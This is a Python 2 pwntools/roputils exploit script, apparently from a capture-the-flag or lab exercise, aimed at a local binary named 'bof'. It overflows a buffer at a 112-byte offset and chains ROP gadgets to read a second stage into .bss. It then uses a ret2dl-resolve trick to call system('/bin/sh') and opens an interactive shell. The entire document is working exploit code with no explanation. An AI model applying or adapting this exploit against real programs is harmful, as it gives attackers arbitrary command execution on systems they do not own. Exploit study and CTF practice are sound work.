#!/usr/bin/python
#coding:utf-8

import roputils
from pwn import *

fpath = './bof'
offset = 112

rop = roputils.ROP(fpath)
addr_bss = rop.section('.bss')

buf = rop.retfill(offset)
buf += rop.call('read', 0, addr_bss, 100)
buf += rop.dl_resolve_call(addr_bss+20, addr_bss)

p=process(fpath)
print p.recv()
p.send(p32(len(buf)) + buf)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
buf += rop.dl_resolve_data(addr_bss+20, 'system')
buf += rop.fill(100, buf)

p.send(buf)
p.interactive()
